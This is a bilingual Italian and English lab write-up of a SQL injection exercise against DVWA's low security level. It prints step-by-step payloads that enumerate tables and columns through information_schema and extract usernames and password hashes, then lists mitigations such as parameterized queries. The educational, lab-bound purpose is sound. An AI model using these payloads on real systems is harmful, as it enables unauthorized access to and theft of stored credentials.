
## SQL Injection – Livello Low (Italiano)

## Descrizione

Nel livello "Low" di DVWA, l'applicazione prende un parametro `id` dalla URL e lo inserisce direttamente in una query SQL senza alcuna validazione.  
Questo rende possibile l'iniezione di codice SQL arbitrario nel backend.

## Obiettivo

Ottenere i nomi utente e le password presenti nel database, sfruttando la vulnerabilità SQL Injection.

## Ambiente di test

- DVWA livello: Low  
- VirtualBox  
- Browser: Firefox  
- Strumenti: Burp Suite, DevTools

## Fasi dell'attacco

### 1. Individuazione della vulnerabilità

Inserendo `1` come valore nel campo `User ID`, l'applicazione mostra il nome e cognome associato all'utente con ID 1.

Iniettando il payload:

```sql
1' OR '1'='1' #
```

L'applicazione ha restituito i nomi e cognomi di tutti gli utenti (5 in totale), dimostrando la presenza di una SQL Injection di tipo tautologica.

---

### 2. Scoperta del numero di colonne

Dall’output visibile (solo `First name` e `Surname`), si è ipotizzato che la query restituisse 2 colonne.

Questa ipotesi è stata confermata con:

```sql
1' UNION SELECT NULL, NULL #
```

La query è stata accettata senza errore → la query originale ha 2 colonne.

---

### 3. Esfiltrazione dei nomi delle tabelle

Con il seguente payload:

```sql
1' UNION SELECT table_name, null FROM information_schema.tables #
```

Sono stati visualizzati i nomi delle tabelle del database corrente. Tra queste, è stata individuata `users`.

---

### 4. Esfiltrazione dei nomi delle colonne

Payload utilizzato:

```sql
1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' #
```

L'output ha mostrato tutte le colonne della tabella `users`, inclusi `user` e `password`.

---

### 5. Esfiltrazione dei dati

Ultimo payload:

```sql
1' UNION SELECT user, password FROM users #
```

Risultato: la pagina ha mostrato correttamente tutti gli username e le password hashate.

> ⚠️ I dati estratti non sono riportati per motivi etici.

---

## Considerazioni finali

Questa esercitazione dimostra come una semplice vulnerabilità SQLi possa compromettere completamente i dati di un'applicazione.  
La mancanza totale di filtri o query preparate rende l'attacco diretto e devastante, anche senza strumenti automatici.

---

## Mitigazioni consigliate

---

Per prevenire la vulnerabilità SQL Injection, è fondamentale adottare le seguenti misure di sicurezza:

- Utilizzare **query parametrizzate** (prepared statements)  
- Evitare di concatenare direttamente input utente nelle query SQL  
- Validare e sanificare accuratamente tutti i dati ricevuti dall’utente  
- Limitare i privilegi dell’utente del database utilizzato dall’applicazione  
- Monitorare e loggare le richieste sospette

---
> ⚠️ **Disclaimer Legale**
> 
> Tutte le attività documentate in questa repository sono state svolte esclusivamente in ambienti controllati, progettati per essere vulnerabili (es. DVWA, TryHackMe, laboratori locali).  
> Nessuna di queste tecniche è stata applicata contro sistemi reali, pubblici o privati, senza autorizzazione esplicita.
> 
> Questa repository ha finalità puramente didattiche ed educative.  
> L’autore **non si assume alcuna responsabilità** per l’uso improprio delle informazioni qui contenute.
---
---

## SQL Injection – Low Level (English)

## Description

In the "Low" level of DVWA, the application takes an `id` parameter from the URL and directly inserts it into an SQL query without any validation.  
This allows arbitrary SQL code injection into the backend.

## Objective

Retrieve all usernames and passwords stored in the database by exploiting the SQL Injection vulnerability.

## Test environment

- DVWA level: Low  
- VirtualBox  
- Browser: Firefox  
- Tools: Burp Suite, DevTools

## Attack steps

### 1. Vulnerability identification

Inputting `1` into the `User ID` field shows the name and surname of the user with ID 1.

Injecting the payload:

```sql
1' OR '1'='1' #
```

The application returned the names and surnames of all users (5 in total), confirming a tautology-based SQL Injection vulnerability.

---

### 2. Discovering the number of columns

Based on the output (`First name` and `Surname`), it was suspected the query returned 2 columns.  
Confirmed with:

```sql
1' UNION SELECT NULL, NULL #
```

No error → the original query uses 2 columns.

---

### 3. Extracting table names

Payload used:

```sql
1' UNION SELECT table_name, null FROM information_schema.tables #
```

This returned the names of all tables in the current database. The `users` table was identified as the target.

---

### 4. Extracting column names

Payload used:

```sql
1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' #
```

The output showed all column names from the `users` table, including `user` and `password`.

---

### 5. Extracting the actual data

Final payload:

```sql
1' UNION SELECT user, password FROM users #
```

Result: all usernames and hashed passwords were successfully displayed.

> ⚠️ Extracted data is intentionally omitted for ethical reasons.

---

## Final thoughts

This lab clearly demonstrates how an unprotected SQL query can be fully manipulated to leak sensitive data.  
Even without tools, a basic SQL Injection can lead to complete compromise when input is not sanitized or filtered.

---

## Recommended mitigation

---

To prevent SQL Injection vulnerabilities, it is essential to adopt the following security measures:

- Use **parameterized queries** (prepared statements)  
- Avoid directly concatenating user input into SQL statements  
- Validate and sanitize all user-provided data  
- Limit database user privileges in the application  
- Monitor and log suspicious requests

---
---
> ⚠️ **Legal Disclaimer**
> 
> All activities documented in this repository were performed **exclusively in controlled environments** specifically designed to be vulnerable (e.g., DVWA, TryHackMe, local labs).
> 
> None of the techniques shown here were executed against real, public, or private systems without explicit authorization.
> 
> This repository is intended **solely for educational and training purposes**.
> 
> The author **assumes no responsibility** for any misuse of the information provided herein.
---
